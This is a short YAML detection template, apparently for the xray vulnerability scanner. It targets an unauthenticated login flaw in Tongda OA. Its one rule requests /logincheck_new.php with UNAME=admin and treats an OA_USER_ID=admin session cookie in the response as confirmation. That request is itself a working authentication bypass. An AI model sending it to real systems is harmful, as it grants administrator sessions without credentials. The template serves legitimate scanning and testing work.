name: poc-yaml-tongda-oa-unauth
binding: 1bc36a19-b07c-4d10-9ad0-b7928fce7c62
manual: true
detail:
    author: Jarcis-cy
    vulnerability:
        id: CT-486382
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /logincheck_new.php?UNAME=admin
        expression: response.status == 200 && response.headers["Set-Cookie"].contains("OA_USER_ID=admin") && response.headers["Content-Type"].contains("text/html") && response.body.bcontains(b"MYOA_STATIC_SERVER")
expression: r0()
